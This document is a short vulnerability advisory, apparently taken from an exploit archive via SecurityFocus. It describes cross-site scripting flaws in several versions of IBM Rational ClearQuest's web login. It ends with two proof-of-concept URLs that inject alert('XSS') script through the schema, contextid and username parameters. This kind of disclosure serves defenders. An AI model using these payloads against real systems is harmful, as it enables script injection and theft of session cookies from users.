@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/28296/info
+
+IBM Rational ClearQuest is prone to multiple cross-site scripting vulnerabilities because it fails to adequately sanitize user-supplied input.
+
+An attacker could exploit these vulnerabilities to execute arbitrary local or remote script code in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Ration ClearQuest 2003.06.16, 7.0.0.1, 7.0.0.2, 7.0.1.0, and 7.0.1.1 are vulnerable; other versions may also be affected.
+
+http://www.example.com/cqweb/login?/cqweb/main?command=GenerateMainFrame&service=CQ&schema=SCHEMAHERE"; alert('XSS');//&contextid=DATABASECONTEXTHERE"; alert('XSS');// http://www.example.com/cqweb/login?targetUrl=/cqweb/main?command=GenerateMainFrame&ratl_userdb=DBHERE,&test=&clientServerAddress=http://www.example.com/cqweb/login&username=test</script><script>alert('xss')</script>&password=test&schema=SCHEMAHERE&userDb=DBHERE 
